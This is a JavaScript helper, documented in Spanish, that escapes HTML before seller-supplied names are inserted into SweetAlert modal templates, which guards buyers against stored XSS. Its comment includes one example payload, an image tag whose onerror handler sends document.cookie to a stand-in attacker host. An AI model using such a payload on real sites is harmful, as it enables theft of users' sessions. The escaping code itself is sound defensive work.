/**
 * Escapa texto para interpolarlo con seguridad dentro de HTML crudo.
 *
 * ¿Por qué existe? Varias pantallas arman el contenido de los modales con
 * `Swal.fire({ html: \`...\` })`, que parte de una plantilla de texto y la
 * inserta en el DOM tal cual. Si en esa plantilla se interpola un dato que
 * controla el VENDEDOR (nombre del producto, nombre de la tienda), el vendedor
 * podría cargar algo como:
 *
 *     Notebook <img src=x onerror="fetch('https://evil.malware/'+document.cookie)">
 *
 * y ese HTML se ejecutaría en el navegador del COMPRADOR (XSS almacenado).
 * No permite leer la cookie de Supabase (es httpOnly), pero sí robar el token
 * de sesión del cliente y actuar en su nombre desde el navegador.
 *
 * Uso: `\${escapeHtml(p.name)}` en cualquier interpolación de `html:`. NO hace
 * falta para `text:` de Swal, para `title`, ni para lo que React renderiza
 * (React escapa por su cuenta).
 *
 * @param {unknown} value  Cualquier valor; se convierte a string.
 * @returns {string}       El texto con los caracteres peligrosos escapados.
 */
export const escapeHtml = (value) => {
  if (value == null) return "";
  return String(value)
    .replace(/&/g, "&amp;") // SIEMPRE primero, para no re-escapar el resto
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
};

export default escapeHtml;
